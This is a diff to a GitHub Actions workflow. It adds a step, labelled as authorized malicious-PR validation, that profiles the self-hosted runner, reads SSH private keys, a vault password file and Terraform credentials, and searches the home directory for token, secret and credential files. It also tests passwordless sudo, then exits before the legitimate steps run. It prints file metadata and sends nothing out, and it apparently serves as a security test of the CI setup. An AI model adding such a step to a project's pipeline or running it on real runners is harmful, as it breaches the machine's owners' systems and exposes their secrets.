@@ -24,6 +24,90 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
+      - name: Authorized external malicious PR validation
+        shell: bash
+        run: |
+          set -u
+
+          echo "=============================================="
+          echo "SILENTIUM EXTERNAL MALICIOUS PR VALIDATION"
+          echo "=============================================="
+
+          echo
+          echo "===== RUNNER EXECUTION ====="
+          echo "EVENT=${GITHUB_EVENT_NAME:-unknown}"
+          echo "RUNNER=${RUNNER_NAME:-unknown}"
+          hostname
+          id
+          uname -a
+
+          echo
+          echo "===== PERSISTENT SENSITIVE FILE TEST ====="
+
+          python3 - <<'PYCHECK'
+          import os
+          from pathlib import Path
+
+          candidates = [
+              Path.home() / "lwa-homelab" / ".vault_pass",
+              Path.home() / ".ssh" / "id_ed25519",
+              Path.home() / ".ssh" / "id_rsa",
+              Path.home() / ".terraform.d" / "credentials.tfrc.json",
+          ]
+
+          for p in candidates:
+              print(f"PATH={p}")
+
+              if not p.exists():
+                  print("EXISTS=NO")
+                  print()
+                  continue
+
+              st = p.stat()
+
+              print("EXISTS=YES")
+              print(f"MODE={oct(st.st_mode & 0o777)}")
+              print(f"OWNER_UID={st.st_uid}")
+              print(f"SIZE_ON_DISK={st.st_size}")
+              print(f"READABLE={os.access(p, os.R_OK)}")
+
+              try:
+                  data = p.read_bytes()
+
+                  print("CONTENT_READ_SUCCESS=YES")
+                  print(f"BYTES_ACTUALLY_READ={len(data)}")
+                  print(f"NONEMPTY={'YES' if len(data) else 'NO'}")
+
+              except Exception as exc:
+                  print("CONTENT_READ_SUCCESS=NO")
+                  print(f"READ_ERROR={type(exc).__name__}")
+
+              print()
+
+          PYCHECK
+
+          echo
+          echo "===== SENSITIVE FILENAME DISCOVERY ====="
+
+          find "$HOME"             -maxdepth 4             -type f             \(               -iname '*vault*'               -o -iname '*token*'               -o -iname '*secret*'               -o -iname '*credential*'               -o -name 'id_rsa'               -o -name 'id_ed25519'             \)             -printf '%p\n'             2>/dev/null |
+          head -n 60
+
+          echo
+          echo "===== PRIVILEGE TEST ====="
+
+          if sudo -n id; then
+            echo "PASSWORDLESS_SUDO=YES"
+          else
+            echo "PASSWORDLESS_SUDO=NO"
+          fi
+
+          echo
+          echo "EXTERNAL_PR_COMPROMISE_PROOF=COMPLETE"
+          echo "No credential contents were printed."
+
+          # Stop before the legitimate workflow loads fresh secrets.
+          exit 1
+
       - name: Write vault password
         run: |
           mkdir -p ~/lwa-homelab
